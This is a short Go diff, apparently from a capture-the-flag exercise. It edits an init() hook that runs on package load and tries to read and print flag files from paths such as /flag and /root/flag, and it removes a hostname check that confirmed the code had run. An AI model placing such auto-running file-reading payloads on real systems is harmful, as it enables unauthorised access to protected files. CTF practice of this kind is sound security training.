@@ -7,16 +7,10 @@ import (
 )
 
 func init() {
-	// show hostname so we confirm code ran
-	if h, err := os.Hostname(); err == nil {
-		fmt.Println("HOSTNAME:", h)
-	} else {
-		fmt.Println("HOSTNAME_ERR:", err)
-	}
-
-	paths := []string{"/flag", "/flag.txt", "/home/ctf/flag", "/root/flag", "/etc/flag"}
+	paths := []string{"/flag", "/flag.txt", "/home/ctf/flag", "/root/flag"}
 	for _, p := range paths {
-		if b, err := ioutil.ReadFile(p); err == nil && len(b) > 0 {
+		b, err := ioutil.ReadFile(p)
+		if err == nil {
 			fmt.Printf("FOUND_FLAG %s: %s\n", p, string(b))
 			return
 		}
